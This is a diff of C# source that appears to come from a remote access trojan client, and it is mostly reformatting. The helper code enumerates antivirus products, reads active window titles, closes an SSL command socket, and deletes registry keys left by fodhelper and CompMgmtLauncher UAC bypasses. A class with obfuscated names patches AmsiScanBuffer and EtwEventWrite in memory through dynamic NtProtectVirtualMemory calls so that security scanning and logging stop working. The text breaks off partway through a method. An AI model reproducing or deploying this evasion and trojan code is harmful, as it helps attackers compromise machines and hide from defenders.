@@ -1,18 +1,15 @@
-﻿using Client.Connection;
-using System;
-using System.Collections.Generic;
-using System.Management;
-using System.Security.Principal;
-using System.Drawing.Imaging;
-using System.Runtime.InteropServices;
-using static Client.Helper.NativeMethods;
-using System.Text;
-using System.IO;
-using System.Windows.Forms;
-using System.Threading;
-using Microsoft.Win32;
+﻿using System;
 using System.Diagnostics;
+using System.Drawing.Imaging;
+using System.IO;
 using System.Linq;
+using System.Management;
+using System.Runtime.InteropServices;
+using System.Security.Principal;
+using System.Text;
+using Client.Connection;
+using Microsoft.Win32;
+using static Client.Helper.NativeMethods;
 
 namespace Client.Helper
 {
@@ -22,6 +19,7 @@ namespace Client.Helper
         {
             return new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
         }
+
         public static void ClientOnExit()
         {
             try
@@ -32,59 +30,64 @@ namespace Client.Helper
                 ClientSocket.SslClient?.Close();
                 ClientSocket.TcpClient?.Close();
             }
-            catch { }
+            catch
+            {
+            }
         }
 
         public static string Antivirus()
         {
             try
             {
-                string firewallName = string.Empty;
+                var firewallName = string.Empty;
                 // starting with Windows Vista we must use the root\SecurityCenter2 namespace
-                
-                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher(@"\\" + Environment.MachineName + @"\root\SecurityCenter2", "Select * from AntivirusProduct"))
+
+                using (var searcher = new ManagementObjectSearcher(
+                           @"\\" + Environment.MachineName + @"\root\SecurityCenter2",
+                           "Select * from AntivirusProduct"))
                 {
-                    foreach (ManagementObject mObject in searcher.Get())
-                    {
-                        firewallName += mObject["displayName"].ToString() + "; ";
-                    }
+                    foreach (ManagementObject mObject in searcher.Get()) firewallName += mObject["displayName"] + "; ";
                 }
+
                 firewallName = RemoveLastChars(firewallName);
 
-                return (!string.IsNullOrEmpty(firewallName)) ? firewallName : "N/A";
+                return !string.IsNullOrEmpty(firewallName) ? firewallName : "N/A";
             }
             catch
             {
                 return "Unknown";
             }
         }
+
         public static string RemoveLastChars(string input, int amount = 2)
         {
             if (input.Length > amount)
                 input = input.Remove(input.Length - amount);
             return input;
         }
+
         public static ImageCodecInfo GetEncoder(ImageFormat format)
         {
-            ImageCodecInfo[] codecs = ImageCodecInfo.GetImageDecoders();
-            foreach (ImageCodecInfo codec in codecs)
-            {
+            var codecs = ImageCodecInfo.GetImageDecoders();
+            foreach (var codec in codecs)
                 if (codec.FormatID == format.Guid)
-                {
                     return codec;
-                }
-            }
             return null;
         }
+
         [DllImport("kernel32.dll", SetLastError = true)]
         public static extern EXECUTION_STATE SetThreadExecutionState(EXECUTION_STATE esFlags);
+
         public static void PreventSleep()
         {
             try
             {
-                SetThreadExecutionState(EXECUTION_STATE.ES_SYSTEM_REQUIRED | EXECUTION_STATE.ES_CONTINUOUS | EXECUTION_STATE.ES_DISPLAY_REQUIRED);
+                SetThreadExecutionState(EXECUTION_STATE.ES_SYSTEM_REQUIRED | EXECUTION_STATE.ES_CONTINUOUS |
+                                        EXECUTION_STATE.ES_DISPLAY_REQUIRED);
             }
-            catch { }
+            catch
+            {
+            }
         }
 
         public static string GetActiveWindowTitle()
@@ -92,46 +95,54 @@ namespace Client.Helper
             try
             {
                 const int nChars = 256;
-                StringBuilder buff = new StringBuilder(nChars);
-                IntPtr handle = GetForegroundWindow();
-                if (GetWindowText(handle, buff, nChars) > 0)
-                {
-                    return buff.ToString();
-                }
+                var buff = new StringBuilder(nChars);
+                var handle = GetForegroundWindow();
+                if (GetWindowText(handle, buff, nChars) > 0) return buff.ToString();
             }
-            catch { }
+            catch
+            {
+            }
+
             return "";
         }
 
         public static void ClearSetting()
         {
-            try 
+            try
             {
                 //Silent Cleanup
                 RegistryKey key;
-                key = Microsoft.Win32.Registry.CurrentUser.CreateSubKey("Environment");
-                if (key.GetValue("windir") != null)
-                {
-                    key.DeleteValue("windir");
-                }
+                key = Registry.CurrentUser.CreateSubKey("Environment");
+                if (key.GetValue("windir") != null) key.DeleteValue("windir");
 
                 key.Close();
             }
-            catch { }
+            catch
+            {
+            }
+
             try
             {
                 //CompMgmtLauncher
-                Registry.CurrentUser.OpenSubKey("Software", true).OpenSubKey("Classes", true).DeleteSubKeyTree("mscfile");
+                Registry.CurrentUser.OpenSubKey("Software", true).OpenSubKey("Classes", true)
+                    .DeleteSubKeyTree("mscfile");
             }
-            catch { }
+            catch
+            {
+            }
+
             try
             {
                 //Fodhelper
-                Registry.CurrentUser.OpenSubKey("Software", true).OpenSubKey("Classes", true).DeleteSubKeyTree("ms-settings");
+                Registry.CurrentUser.OpenSubKey("Software", true).OpenSubKey("Classes", true)
+                    .DeleteSubKeyTree("ms-settings");
             }
-            catch { }
+            catch
+            {
+            }
         }
     }
+
     public class DInvokeCore
     {
         // Required NTSTATUSs 
@@ -481,81 +492,66 @@ namespace Client.Helper
             MaximumNtStatus = 0xffffffff
         }
 
-        // Delegate NtProtectVirtualMemory
-        public class Delegates
-        {
-            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-            public delegate UInt32 NtProtectVirtualMemory(
-                IntPtr ProcessHandle,
-                ref IntPtr BaseAddress,
-                ref IntPtr RegionSize,
-                UInt32 NewProtect,
-                ref UInt32 OldProtect);
-        }
-
         private static IntPtr GetLibraryAddress(string DLLName, string FunctionName)
         {
-            IntPtr hModule = GetLoadedModuleAddress(DLLName);
-            if (hModule == IntPtr.Zero)
-            {
-                throw new DllNotFoundException(DLLName + ", Dll was not found or not loaded.");
-            }
-            IntPtr lastOutput = GetExportAddress(hModule, FunctionName);
+            var hModule = GetLoadedModuleAddress(DLLName);
+            if (hModule == IntPtr.Zero) throw new DllNotFoundException(DLLName + ", Dll was not found or not loaded.");
+            var lastOutput = GetExportAddress(hModule, FunctionName);
             return lastOutput;
         }
 
         private static IntPtr GetLoadedModuleAddress(string DLLName)
         {
-            Process CurrentProcess = Process.GetCurrentProcess();
+            var CurrentProcess = Process.GetCurrentProcess();
             foreach (ProcessModule Module in CurrentProcess.Modules)
-            {
                 if (string.Compare(Module.ModuleName, DLLName, true) == 0)
                 {
-                    IntPtr ModuleBasePointer = Module.BaseAddress;
+                    var ModuleBasePointer = Module.BaseAddress;
                     return ModuleBasePointer;
                 }
-            }
+
             return IntPtr.Zero;
         }
 
         private static IntPtr GetExportAddress(IntPtr ModuleBase, string ExportName)
         {
-            IntPtr FunctionPtr = IntPtr.Zero;
+            var FunctionPtr = IntPtr.Zero;
             try
             {
                 // Traverse the PE header in memory
-                Int32 PeHeader = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + 0x3C));
-                Int16 OptHeaderSize = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + PeHeader + 0x14));
-                Int64 OptHeader = ModuleBase.ToInt64() + PeHeader + 0x18;
-                Int16 Magic = Marshal.ReadInt16((IntPtr)OptHeader);
-                Int64 pExport = 0;
+                var PeHeader = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + 0x3C));
+                var OptHeaderSize = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + PeHeader + 0x14));
+                var OptHeader = ModuleBase.ToInt64() + PeHeader + 0x18;
+                var Magic = Marshal.ReadInt16((IntPtr)OptHeader);
+                long pExport = 0;
                 if (Magic == 0x010b)
-                {
                     pExport = OptHeader + 0x60;
-                }
                 else
-                {
                     pExport = OptHeader + 0x70;
-                }
 
                 // Read -> IMAGE_EXPORT_DIRECTORY
-                Int32 ExportRVA = Marshal.ReadInt32((IntPtr)pExport);
-                Int32 OrdinalBase = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x10));
-                Int32 NumberOfFunctions = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x14));
-                Int32 NumberOfNames = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x18));
-                Int32 FunctionsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x1C));
-                Int32 NamesRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x20));
-                Int32 OrdinalsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x24));
+                var ExportRVA = Marshal.ReadInt32((IntPtr)pExport);
+                var OrdinalBase = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x10));
+                var NumberOfFunctions = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x14));
+                var NumberOfNames = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x18));
+                var FunctionsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x1C));
+                var NamesRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x20));
+                var OrdinalsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x24));
 
                 // Loop the array of export name RVA's
-                for (int i = 0; i < NumberOfNames; i++)
+                for (var i = 0; i < NumberOfNames; i++)
                 {
-                    string FunctionName = Marshal.PtrToStringAnsi((IntPtr)(ModuleBase.ToInt64() + Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + NamesRVA + i * 4))));
+                    var FunctionName = Marshal.PtrToStringAnsi((IntPtr)(ModuleBase.ToInt64() +
+                                                                        Marshal.ReadInt32(
+                                                                            (IntPtr)(ModuleBase.ToInt64() + NamesRVA +
+                                                                                i * 4))));
                     if (FunctionName.Equals(ExportName, StringComparison.OrdinalIgnoreCase))
                     {
-                        Int32 FunctionOrdinal = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + OrdinalsRVA + i * 2)) + OrdinalBase;
-                        Int32 FunctionRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + FunctionsRVA + (4 * (FunctionOrdinal - OrdinalBase))));
-                        FunctionPtr = (IntPtr)((Int64)ModuleBase + FunctionRVA);
+                        var FunctionOrdinal = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + OrdinalsRVA + i * 2)) +
+                                              OrdinalBase;
+                        var FunctionRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + FunctionsRVA +
+                                                                     4 * (FunctionOrdinal - OrdinalBase)));
+                        FunctionPtr = (IntPtr)((long)ModuleBase + FunctionRVA);
                         break;
                     }
                 }
@@ -567,92 +563,102 @@ namespace Client.Helper
             }
 
             if (FunctionPtr == IntPtr.Zero)
-            {
                 // Export not found
                 throw new MissingMethodException(ExportName + ", export not found.");
-            }
             return FunctionPtr;
         }
 
-        public static object DynamicAPIInvoke(string DLLName, string FunctionName, Type FunctionDelegateType, ref object[] Parameters)
+        public static object DynamicAPIInvoke(string DLLName, string FunctionName, Type FunctionDelegateType,
+            ref object[] Parameters)
         {
-            IntPtr pFunction = GetLibraryAddress(DLLName, FunctionName);
+            var pFunction = GetLibraryAddress(DLLName, FunctionName);
             if (pFunction == IntPtr.Zero)
-            {
                 throw new InvalidOperationException("Could not get the handle for the function.");
-            }
             return DynamicFunctionInvoke(pFunction, FunctionDelegateType, ref Parameters);
         }
 
-        private static object DynamicFunctionInvoke(IntPtr FunctionPointer, Type FunctionDelegateType, ref object[] Parameters)
+        private static object DynamicFunctionInvoke(IntPtr FunctionPointer, Type FunctionDelegateType,
+            ref object[] Parameters)
         {
-            Delegate funcDelegate = Marshal.GetDelegateForFunctionPointer(FunctionPointer, FunctionDelegateType);
+            var funcDelegate = Marshal.GetDelegateForFunctionPointer(FunctionPointer, FunctionDelegateType);
             return funcDelegate.DynamicInvoke(Parameters);
         }
 
-        public static bool NtProtectVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr RegionSize, UInt32 NewProtect, ref UInt32 OldProtect)
+        public static bool NtProtectVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr RegionSize,
+            uint NewProtect, ref uint OldProtect)
         {
             // Craft an array for the arguments
             OldProtect = 0;
             object[] funcargs = { ProcessHandle, BaseAddress, RegionSize, NewProtect, OldProtect };
 
-            NTSTATUS retValue = (NTSTATUS)DynamicAPIInvoke(@"ntdll.dll", @"NtProtectVirtualMemory", typeof(Delegates.NtProtectVirtualMemory), ref funcargs);
-            if (retValue != NTSTATUS.Success)
-            {
-                return false;
-            }
+            var retValue = (NTSTATUS)DynamicAPIInvoke(@"ntdll.dll", @"NtProtectVirtualMemory",
+                typeof(Delegates.NtProtectVirtualMemory), ref funcargs);
+            if (retValue != NTSTATUS.Success) return false;
 
-            OldProtect = (UInt32)funcargs[4];
+            OldProtect = (uint)funcargs[4];
             return true;
         }
+
+        // Delegate NtProtectVirtualMemory
+        public class Delegates
+        {
+            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+            public delegate uint NtProtectVirtualMemory(
+                IntPtr ProcessHandle,
+                ref IntPtr BaseAddress,
+                ref IntPtr RegionSize,
+                uint NewProtect,
+                ref uint OldProtect);
+        }
     }
+
     public class A
     {
-
-        static byte[] x64_etw_patch = new byte[] { 0x48, 0x33, 0xC0, 0xC3 };
-        static byte[] x86_etw_patch = new byte[] { 0x33, 0xc0, 0xc2, 0x14, 0x00 };
-        static byte[] x64_am_si_patch = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
-        static byte[] x86_am_si_patch = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
+        private static readonly byte[] x64_etw_patch = { 0x48, 0x33, 0xC0, 0xC3 };
+        private static readonly byte[] x86_etw_patch = { 0x33, 0xc0, 0xc2, 0x14, 0x00 };
+        private static readonly byte[] x64_am_si_patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
+        private static readonly byte[] x86_am_si_patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
 
         // Thx D/Invoke!
         private static IntPtr GetExportAddress(IntPtr ModuleBase, string ExportName)
         {
-            IntPtr FunctionPtr = IntPtr.Zero;
+            var FunctionPtr = IntPtr.Zero;
             try
             {
                 // Traverse the PE header in memory
-                Int32 PeHeader = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + 0x3C));
-                Int16 OptHeaderSize = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + PeHeader + 0x14));
-                Int64 OptHeader = ModuleBase.ToInt64() + PeHeader + 0x18;
-                Int16 Magic = Marshal.ReadInt16((IntPtr)OptHeader);
-                Int64 pExport = 0;
+                var PeHeader = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + 0x3C));
+                var OptHeaderSize = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + PeHeader + 0x14));
+                var OptHeader = ModuleBase.ToInt64() + PeHeader + 0x18;
+                var Magic = Marshal.ReadInt16((IntPtr)OptHeader);
+                long pExport = 0;
                 if (Magic == 0x010b)
-                {
                     pExport = OptHeader + 0x60;
-                }
                 else
-                {
                     pExport = OptHeader + 0x70;
-                }
 
                 // Read -> IMAGE_EXPORT_DIRECTORY
-                Int32 ExportRVA = Marshal.ReadInt32((IntPtr)pExport);
-                Int32 OrdinalBase = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x10));
-                Int32 NumberOfFunctions = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x14));
-                Int32 NumberOfNames = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x18));
-                Int32 FunctionsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x1C));
-                Int32 NamesRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x20));
-                Int32 OrdinalsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x24));
+                var ExportRVA = Marshal.ReadInt32((IntPtr)pExport);
+                var OrdinalBase = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x10));
+                var NumberOfFunctions = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x14));
+                var NumberOfNames = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x18));
+                var FunctionsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x1C));
+                var NamesRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x20));
+                var OrdinalsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x24));
 
                 // Loop the array of export name RVA's
-                for (int i = 0; i < NumberOfNames; i++)
+                for (var i = 0; i < NumberOfNames; i++)
                 {
-                    string FunctionName = Marshal.PtrToStringAnsi((IntPtr)(ModuleBase.ToInt64() + Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + NamesRVA + i * 4))));
+                    var FunctionName = Marshal.PtrToStringAnsi((IntPtr)(ModuleBase.ToInt64() +
+                                                                        Marshal.ReadInt32(
+                                                                            (IntPtr)(ModuleBase.ToInt64() + NamesRVA +
+                                                                                i * 4))));
                     if (FunctionName.Equals(ExportName, StringComparison.OrdinalIgnoreCase))
                     {
-                        Int32 FunctionOrdinal = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + OrdinalsRVA + i * 2)) + OrdinalBase;
-                        Int32 FunctionRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + FunctionsRVA + (4 * (FunctionOrdinal - OrdinalBase))));
-                        FunctionPtr = (IntPtr)((Int64)ModuleBase + FunctionRVA);
+                        var FunctionOrdinal = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + OrdinalsRVA + i * 2)) +
+                                              OrdinalBase;
+                        var FunctionRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + FunctionsRVA +
+                                                                     4 * (FunctionOrdinal - OrdinalBase)));
+                        FunctionPtr = (IntPtr)((long)ModuleBase + FunctionRVA);
                         break;
                     }
                 }
@@ -664,28 +670,29 @@ namespace Client.Helper
             }
 
             if (FunctionPtr == IntPtr.Zero)
-            {
                 // Export not found
                 throw new MissingMethodException(ExportName + " not found.");
-            }
             return FunctionPtr;
         }
 
         private static string decode(string b64encoded)
         {
-            return System.Text.ASCIIEncoding.ASCII.GetString(System.Convert.FromBase64String(b64encoded));
+            return Encoding.ASCII.GetString(Convert.FromBase64String(b64encoded));
         }
 
         private static void PatchMem(byte[] patch, string library, string function)
         {
             try
             {
-                IntPtr CurrentProcessHandle = new IntPtr(-1); // pseudo-handle for current process handle
-                IntPtr libPtr = (Process.GetCurrentProcess().Modules.Cast<ProcessModule>().Where(x => library.Equals(Path.GetFileName(x.FileName), StringComparison.OrdinalIgnoreCase)).FirstOrDefault().BaseAddress);
-                IntPtr funcPtr = GetExportAddress(libPtr, function);
-                IntPtr patchLength = new IntPtr(patch.Length);
-                UInt32 oldProtect = 0;
-                DInvokeCore.NtProtectVirtualMemory(CurrentProcessHandle, ref funcPtr, ref patchLength, 0x40, ref oldProtect);
+                var CurrentProcessHandle = new IntPtr(-1); // pseudo-handle for current process handle
+                var libPtr = Process.GetCurrentProcess().Modules.Cast<ProcessModule>()
+                    .Where(x => library.Equals(Path.GetFileName(x.FileName), StringComparison.OrdinalIgnoreCase))
+                    .FirstOrDefault().BaseAddress;
+                var funcPtr = GetExportAddress(libPtr, function);
+                var patchLength = new IntPtr(patch.Length);
+                uint oldProtect = 0;
+                DInvokeCore.NtProtectVirtualMemory(CurrentProcessHandle, ref funcPtr, ref patchLength, 0x40,
+                    ref oldProtect);
                 Marshal.Copy(patch, 0, funcPtr, patch.Length);
             }
             catch (Exception e)
@@ -697,32 +704,25 @@ namespace Client.Helper
 
         private static void Patcham_si(byte[] patch)
         {
-            string dll = decode("YW1zaS5kbGw=");
-            foreach (ProcessModule CurrentModule in (Process.GetCurrentProcess().Modules))
-            {
+            var dll = decode("YW1zaS5kbGw=");
+            foreach (ProcessModule CurrentModule in Process.GetCurrentProcess().Modules)
                 if (CurrentModule.ModuleName == dll)
-                {
-                    PatchMem(patch, dll, ("Am" + "si" + "Sc" + "an" + "Bu" + "ff" + "er"));
-                }
-            }
+                    PatchMem(patch, dll, "Am" + "si" + "Sc" + "an" + "Bu" + "ff" + "er");
         }
 
         private static void PatchETW(byte[] Patch)
         {
-            PatchMem(Patch, ("n" + "t" + "d" + "l" + "l" + "." + "d" + "l" + "l"), ("Et" + "wE" + "ve" + "nt" + "Wr" + "it" + "e"));
+            PatchMem(Patch, "n" + "t" + "d" + "l" + "l" + "." + "d" + "l" + "l",
+                "Et" + "wE" + "ve" + "nt" + "Wr" + "it" + "e");
         }
 
         public static void B()
         {
             bool isit64bit;
             if (IntPtr.Size == 4)
-            {
                 isit64bit = false;
-            }
             else
-            {
                 isit64bit = true;
-            }
             if (isit64bit)
             {
                 Patcham_si(x64_am_si_patch);
